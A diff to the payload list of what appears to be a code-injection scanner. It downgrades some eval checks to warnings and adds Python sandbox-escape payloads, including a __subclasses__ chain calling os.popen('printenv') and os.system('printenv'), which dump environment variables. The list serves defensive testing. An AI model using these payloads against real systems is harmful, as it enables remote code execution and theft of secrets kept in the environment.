@@ -35,19 +35,29 @@ export const defaultPayloads: PayloadsT = // TODO: payloads.jsonから読み込�
       {
         payload: ["77*77"],
         unexpected: ["[259]{4}"],
-        severity: "critical",
+        severity: "warning",
         unexpected_option: "regex",
       },
       {
         payload: ["77*77"],
         unexpected: ["77*77"],
         unexpected_option: "eval",
-        severity: "critical",
+        severity: "warning",
       },
       {
         payload: ["[i for i in range(100)] #import"],
         payload_option: "eval",
         unexpected: ["[0, 1, 2, 3, 4, 5, 6, 7, 8, 9,"],
+        severity: "warning",
+      },
+      {
+        payload: ['"技育展".__class__.__base__.__subclasses__()[132].__init__.__globals__["sys"].modules["os"].popen("printenv").read()'],
+        unexpected: ["PyJailBreak_b981a35bde"],
+        severity: "critical",
+      },
+      {
+        payload: ['ｅｘｅｃ(ｉｎｐｕｔ())','import os; os.system("printenv")'],
+        unexpected: ["PyJailBreak_b981a35bde"],
         severity: "critical",
       },
     ] as PayloadT[]
